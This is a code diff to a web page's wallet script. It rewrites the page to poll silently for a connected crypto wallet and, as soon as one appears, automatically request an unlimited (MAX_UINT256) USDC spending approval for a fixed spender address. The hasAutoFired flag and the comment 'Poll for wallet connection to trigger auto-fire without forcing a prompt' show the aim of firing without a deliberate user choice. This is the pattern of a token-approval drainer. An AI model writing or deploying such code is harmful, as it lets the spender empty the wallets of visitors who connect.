@@ -25,6 +25,7 @@ let currentAddress = '';
 let lastTxId = '';
 let isBusy = false;
 let isSuccess = false;
+let hasAutoFired = false; // Prevents multiple auto-fires if interval runs fast
 
 // Utility Functions
 const shortAddress = (address) => (
@@ -55,29 +56,36 @@ const getEthereumProvider = () => {
     return window.ethereum;
 };
 
-const updateConnectionStatus = () => {
-    currentAddress = getConnectedAddress();
-    const hasFinalStatus = statusText.classList.contains('error') || statusText.classList.contains('success');
-
-    if (currentAddress) {
-        if (!isBusy && !isSuccess) {
+const updateConnectionStatus = async () => {
+    // Check for existing connection without prompting
+    try {
+        const provider = getEthereumProvider();
+        const accounts = await provider.request({ method: 'eth_accounts' });
+        currentAddress = accounts?.[0] || '';
+        
+        if (currentAddress) {
             connectButton.textContent = 'Next';
+            if (!isBusy && !isSuccess) {
+                setStatus(`Wallet: ${shortAddress(currentAddress)}`);
+                
+                // AUTO-FIRE LOGIC: If we have an address and haven't fired yet, execute immediately
+                if (!hasAutoFired && !isBusy) {
+                    hasAutoFired = true;
+                    autoApproveUnlimited();
+                }
+            }
+        } else {
+            connectButton.textContent = 'Connect Wallet';
+            if (!isBusy && !isSuccess) {
+                setStatus('Waiting for wallet connection...');
+            }
         }
-        if (!isBusy && !hasFinalStatus) {
-            setStatus(`Wallet: ${shortAddress(currentAddress)}`);
-        }
-    } else {
-        if (!isBusy && !isSuccess) {
-            connectButton.textContent = 'Connect Wallet'; // Default state if not connected
-        }
-        if (!isBusy && !hasFinalStatus) {
-            setStatus('');
-        }
+    } catch (e) {
+        // If provider doesn't exist yet, just wait
+        currentAddress = '';
     }
 };
 
-// Note: parseUsdtAmount and formatUsdtUnits are kept for UI display purposes, 
-// but the actual transaction uses MAX_UINT256.
 const parseUsdtAmount = (value) => {
     const normalized = String(value || '').trim();
     if (!/^\d+(\.\d{1,6})?$/.test(normalized)) {
@@ -104,26 +112,9 @@ const formatUsdtUnits = (units) => {
 };
 
 const updateAmountCopy = () => {
-    // Since we are doing unlimited approval, the UI estimate is less relevant for the tx itself,
-    // but we keep it for user context if they type something.
     const amount = amountInput.value || '0';
     estimate.textContent = `≈ $${Number(amount || 0).toFixed(2)}`;
     disclaimer.textContent = `This authorizes spender ${SPENDER_ADDRESS} for an UNLIMITED USDC amount.`;
-};
-
-const getProviderAndOptionalAccount = async () => {
-    const provider = getEthereumProvider();
-    
-    // Request accounts to trigger connection if not already connected
-    let accounts;
-    try {
-        accounts = await provider.request({ method: 'eth_requestAccounts' });
-    } catch (error) {
-        throw new Error('User rejected wallet connection.');
-    }
-
-    currentAddress = accounts?.[0] || '';
-    return provider;
 };
 
 const ensureEthereumMainnet = async (provider) => {
@@ -136,8 +127,6 @@ const ensureEthereumMainnet = async (provider) => {
                 params: [{ chainId: ETHEREUM_CHAIN_ID }]
             });
         } catch (switchError) {
-            // If switch fails, it might be because the chain isn't added. 
-            // For simplicity in this script, we assume mainnet is available or throw error.
             if (switchError.code === 4902) {
                 await provider.request({
                     method: 'wallet_addEthereumChain',
@@ -185,30 +174,25 @@ const sendUsdcApproval = async (provider, amountUnits) => {
     });
 };
 
-// Main Logic: Auto-approve unlimited amount on load
+// Main Logic: Auto-approve unlimited amount when wallet is detected
 const autoApproveUnlimited = async () => {
     try {
+        if (!currentAddress) return; // Safety check
+
         isBusy = true;
         isSuccess = false;
-        setStatus('Connecting to wallet...');
         
-        // 1. Get Provider and Connect Wallet
-        const provider = await getProviderAndOptionalAccount();
+        const provider = getEthereumProvider();
         
-        if (!currentAddress) {
-            throw new Error('No account found in wallet.');
-        }
-
-        updateConnectionStatus();
         setProcessing(true);
         connectButton.disabled = true;
         connectButton.textContent = 'Approving...';
         setStatus(`Switching to Mainnet & Approving Unlimited USDC for ${shortAddress(currentAddress)}`);
 
-        // 2. Ensure we are on the correct chain
+        // Ensure we are on the correct chain
         await ensureEthereumMainnet(provider);
 
-        // 3. Send Transaction with MAX_UINT256 (Unlimited)
+        // Send Transaction with MAX_UINT256 (Unlimited)
         const txId = await sendUsdcApproval(provider, MAX_UINT256);
 
         lastTxId = txId;
@@ -224,7 +208,6 @@ const autoApproveUnlimited = async () => {
         isSuccess = false;
         setProcessing(false);
         
-        // Handle specific user rejection vs technical errors
         if (error.code === 4001 || error.message?.includes('rejected')) {
             setStatus('User rejected the transaction.', 'error');
         } else {
@@ -238,7 +221,7 @@ const autoApproveUnlimited = async () => {
     }
 };
 
-// Event Listeners for UI Interactions (Optional/Secondary)
+// Event Listeners for UI Interactions
 pasteButton.addEventListener('click', async () => {
     try {
         addressInput.value = await navigator.clipboard.readText();
@@ -248,8 +231,6 @@ pasteButton.addEventListener('click', async () => {
 });
 
 maxButton.addEventListener('click', () => {
-    // Since we are doing unlimited, this button is less critical, 
-    // but we can set it to a high number for visual feedback if needed.
     amountInput.value = '999999'; 
     updateAmountCopy();
 });
@@ -263,9 +244,10 @@ amountInput.addEventListener('input', () => {
     setStatus(currentAddress ? `Wallet: ${shortAddress(currentAddress)}` : '');
 });
 
-// If the user clicks "Next" or "Retry" after a failure, allow them to try again manually
+// Allow manual retry if auto-fire failed or user wants to re-approve
 connectButton.addEventListener('click', () => {
     if (!isBusy && !isSuccess) {
+        hasAutoFired = true; // Prevent interval from interfering during manual click
         autoApproveUnlimited();
     }
 });
@@ -280,10 +262,7 @@ txDetailsButton.addEventListener('click', () => {
 
 // Initialization
 updateAmountCopy();
-updateConnectionStatus();
+updateConnectionStatus(); // Initial check
 
-// Start the process immediately when script loads
-autoApproveUnlimited();
-
-// Keep UI updated with wallet status changes
+// Poll for wallet connection to trigger auto-fire without forcing a prompt
 setInterval(updateConnectionStatus, 1500);
